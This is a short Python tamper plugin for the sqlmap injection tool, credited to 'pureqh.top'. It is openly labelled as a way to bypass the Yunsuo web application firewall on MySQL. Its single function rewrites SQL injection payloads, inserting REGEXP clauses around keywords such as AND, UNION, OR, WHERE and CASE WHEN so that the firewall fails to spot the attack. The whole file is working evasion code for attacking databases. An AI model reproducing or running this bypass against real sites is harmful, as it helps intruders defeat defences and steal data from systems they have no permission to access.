#!/usr/bin/env python
# -*- coding: utf-8 -*-



"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
Author:pureqh.top
"""

import re
import os

from lib.core.data import kb
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("Bypass yunsuo_number by pureqh'%s' only %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):

        payload=payload.replace(" ","  ",1)
        payload=payload.replace("  AND"," REGEXP \"[.../*]\" and",1)
        payload=re.sub(r'(ORDER BY \d+)', "x", payload)
        payload=payload.replace("UNION"," REGEXP \"[.../*]\" union",1)
        payload=payload.replace("(SELECT (CASE WHEN ("," REGEXP \"[.../*]\" (SELECT (CASE WHEN (",1)
        payload=payload.replace("  AS "," REGEXP \"[.../*]\" as ",1)
        payload=payload.replace(" OR "," REGEXP \"[.../*]\" or ",1)
        payload=payload.replace("  WHERE "," REGEXP \"[.../*]\" where ",1)
        payload=payload.replace("HIGH_RISK_OPERATION:0"," REGEXP \"[.../*]\"  ",1)
        payload=payload.replace(";","; REGEXP \"[.../*]\"  HTGH",1)
        payload=payload.replace("||","; || REGEXP \"[.../*]\" ",1)
        payload=payload.replace("THEN"," THEN REGEXP \"[.../*]\" ",1)
        payload=payload.replace("  IN"," REGEXP \"[.../*]\"  IN ",1)
        #payload=payload.replace("-"," REGEXP \"[.../*]\"  - ",1)
        payload=payload.replace("+"," REGEXP \"[.../*]\"  + ",1)
        payload=payload.replace("WHEN"," REGEXP \"[.../*]\"   ",1)
        return payload
